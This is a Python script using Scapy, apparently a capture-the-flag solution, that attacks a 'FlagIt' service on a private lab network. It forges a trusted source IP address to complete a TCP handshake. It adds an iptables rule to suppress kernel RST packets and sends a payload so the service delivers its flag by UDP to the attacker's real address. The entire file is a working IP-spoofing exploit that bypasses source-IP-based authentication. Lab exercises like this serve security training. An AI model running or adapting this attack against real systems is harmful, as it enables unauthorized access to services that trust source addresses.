#!/usr/bin/env python3
"""
TCP Spoofing Attack - FlagIt Service
Bypasses source-IP-based authentication by spoofing a trusted IP address
to complete a TCP handshake and retrieve a flag delivered via UDP.
"""

from scapy.all import *
import os, random, threading, time

# Configuration
TARGET_IP  = "10.0.0.3"
TRUSTED_IP = "10.2.4.10"
MY_REAL_IP = "10.0.0.2"
TCP_PORT   = 13337
IFACE      = "eth0"
SRC_PORT   = random.randint(32000, 45000)
MY_ISN     = random.randint(1000, 50000)

def main():
    # Block kernel from auto-sending RST packets
    os.system(f"iptables -A OUTPUT -p tcp --sport {SRC_PORT} --tcp-flags RST RST -j DROP")
    print(f"[*] iptables RST block added (port {SRC_PORT})")

    # Start UDP listener to capture incoming flag
    flag_received = []
    def udp_sniffer():
        pkts = sniff(iface=IFACE, filter=f"udp and dst port {TCP_PORT}", count=1, timeout=15)
        for p in pkts:
            if p.haslayer(Raw):
                flag_received.append(p[Raw].load.decode(errors='ignore').strip())

    listener = threading.Thread(target=udp_sniffer, daemon=True)
    listener.start()
    time.sleep(0.3)

    # Step 1: Send spoofed SYN
    print(f"[*] Step 1: Sending SYN (spoofed src={TRUSTED_IP}, sport={SRC_PORT})")
    syn = IP(src=TRUSTED_IP, dst=TARGET_IP) / TCP(
        sport=SRC_PORT, dport=TCP_PORT,
        seq=MY_ISN, flags="S"
    )
    syn_ack = sr1(syn, iface=IFACE, timeout=5, verbose=0)

    if not syn_ack or not syn_ack.haslayer(TCP):
        print("[!] Failed to receive SYN-ACK. Exiting.")
        os.system(f"iptables -D OUTPUT -p tcp --sport {SRC_PORT} --tcp-flags RST RST -j DROP")
        return

    # Step 2: Extract server ISN from SYN-ACK
    server_isn = syn_ack[TCP].seq
    print(f"[*] Step 2: SYN-ACK received — server ISN: {server_isn}")

    # Step 3: Complete handshake with ACK
    ack = IP(src=TRUSTED_IP, dst=TARGET_IP) / TCP(
        sport=SRC_PORT, dport=TCP_PORT,
        seq=MY_ISN + 1, ack=server_isn + 1,
        flags="A"
    )
    send(ack, iface=IFACE, verbose=0)
    print("[*] Step 3: ACK sent — handshake complete")
    time.sleep(0.3)

    # Step 4: Send payload (our real IP) to receive the flag via UDP
    payload = MY_REAL_IP + "\n"
    data_pkt = IP(src=TRUSTED_IP, dst=TARGET_IP) / TCP(
        sport=SRC_PORT, dport=TCP_PORT,
        seq=MY_ISN + 1, ack=server_isn + 1,
        flags="PA"
    ) / payload
    send(data_pkt, iface=IFACE, verbose=0)
    print(f"[*] Step 4: Payload sent — requesting flag delivery to {MY_REAL_IP}")

    # Wait for UDP flag
    print("[*] Waiting for UDP flag (up to 10 seconds)...")
    listener.join(timeout=10)

    # Cleanup
    os.system(f"iptables -D OUTPUT -p tcp --sport {SRC_PORT} --tcp-flags RST RST -j DROP")
    print("[*] iptables rule removed")

    # Result
    if flag_received:
        print("\n" + "=" * 50)
        print(f"[+] FLAG: {flag_received[0]}")
        print("=" * 50)
    else:
        print("[!] Flag not received.")

if __name__ == "__main__":
    main()
